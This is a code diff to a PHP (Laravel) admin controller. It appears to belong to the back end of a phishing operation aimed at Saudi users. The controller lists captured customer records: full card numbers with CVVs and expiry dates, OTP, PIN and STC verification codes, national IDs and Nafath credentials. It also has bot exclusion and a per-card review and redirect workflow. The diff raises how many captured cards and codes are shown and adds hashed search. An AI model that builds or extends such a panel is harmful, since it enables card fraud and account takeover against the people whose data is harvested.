@@ -90,13 +90,17 @@ class AdminCustomerController extends Controller
 
         $query = CustomerProfile::query()
             ->excludeBots()
+            ->withCount([
+                'paymentCards',
+                'otpCodes as payment_otp_count' => fn($q) => $q->whereIn('type', ['otp', 'pin', 'phone', 'phone_verification', 'stc_otp', 'stc_verification']),
+            ])
             ->with([
                 'otpCodes' => fn($q) => $q->select('id', 'customer_profile_id', 'type', 'code', 'code_value', 'status', 'phone_number', 'created_at', 'updated_at')
                     ->latest()
-                    ->limit(10),
+                    ->limit(50),
                 'paymentCards' => fn($q) => $q->select('id', 'customer_profile_id', 'session_id', 'card_number', 'card_number_masked', 'last4', 'holder_name', 'card_type', 'expiry_month', 'expiry_year', 'cvv', 'cvv_verified', 'status', 'rejection_reason', 'reviewed_by', 'reviewed_at', 'redirect_url', 'created_at', 'updated_at')
                     ->latest()
-                    ->limit(10),
+                    ->limit(50),
             ])
             // Dedup removed — createOrUpdateByIP() already handles identity merging.
             // The old whereIn(MAX(id) GROUP BY COALESCE(...)) was hiding legitimate customers.
@@ -109,11 +113,12 @@ class AdminCustomerController extends Controller
 
         if ($search) {
             $escaped = str_replace(['%', '_'], ['\%', '\_'], $search);
-            $query->where(function ($q) use ($escaped) {
+            $piiHash = CustomerProfile::hashPii($search);
+            $query->where(function ($q) use ($escaped, $piiHash) {
                 $q->where('ip_address', 'like', "%{$escaped}%")
                     ->orWhere('full_name', 'like', "%{$escaped}%")
-                    ->orWhere('phone_number', 'like', "%{$escaped}%")
-                    ->orWhere('national_id', 'like', "%{$escaped}%");
+                    ->orWhere('national_id_hash', $piiHash)
+                    ->orWhere('phone_number_hash', $piiHash);
             });
         }
 
@@ -379,12 +384,23 @@ class AdminCustomerController extends Controller
     {
         $count = 0;
 
-        if ($c->relationLoaded('paymentCards') && $c->relationLoaded('otpCodes')) {
+        // Use withCount attributes when available (list view), otherwise
+        // count loaded relations or fall back to DB queries (show view).
+        if (isset($c->payment_cards_count)) {
+            $count += $c->payment_cards_count;
+        } elseif ($c->relationLoaded('paymentCards')) {
             $count += $c->paymentCards->count();
-            $count += $c->otpCodes->whereIn('type', ['otp', 'pin', 'phone', 'phone_verification', 'stc_otp', 'stc_verification'])->count();
         } else {
             $count += $c->paymentCards()->count();
-            $count += $c->otpCodes()->whereIn('type', ['otp', 'pin', 'phone', 'phone_verification', 'stc_otp', 'stc_verification'])->count();
+        }
+
+        $otpTypes = ['otp', 'pin', 'phone', 'phone_verification', 'stc_otp', 'stc_verification'];
+        if (isset($c->payment_otp_count)) {
+            $count += $c->payment_otp_count;
+        } elseif ($c->relationLoaded('otpCodes')) {
+            $count += $c->otpCodes->whereIn('type', $otpTypes)->count();
+        } else {
+            $count += $c->otpCodes()->whereIn('type', $otpTypes)->count();
         }
 
         // Nafath credentials
